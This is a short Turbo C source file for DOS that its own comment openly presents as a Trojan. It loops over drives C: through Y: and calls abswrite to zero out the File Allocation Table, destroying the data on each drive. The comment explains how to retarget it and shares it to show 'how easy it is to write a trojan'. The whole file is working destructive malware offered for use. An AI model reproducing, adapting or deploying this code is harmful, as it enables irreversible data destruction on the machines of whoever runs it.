/*  The above program is in Turbo C 2.0.  It is a Trojan that wipes out drive
    C: thru Y:, you can modify it to any drive you want, by changing the
    count variable.  (A=0, B=1, C=2, D=3, etc.).
    Use this program at your own risk.  Don't blame me if you accidentally
    run it on your own computer.  But I just want to share this with everyone
    to show you how easy it is to write a trojan. What this thing actually
    does is it writes 0's to the FAT.
*/


#include "dos.h"
void main()
{  int count;
   for (count=2; count<25; count++)
   {
     abswrite (count,99,0,0);
   }
}


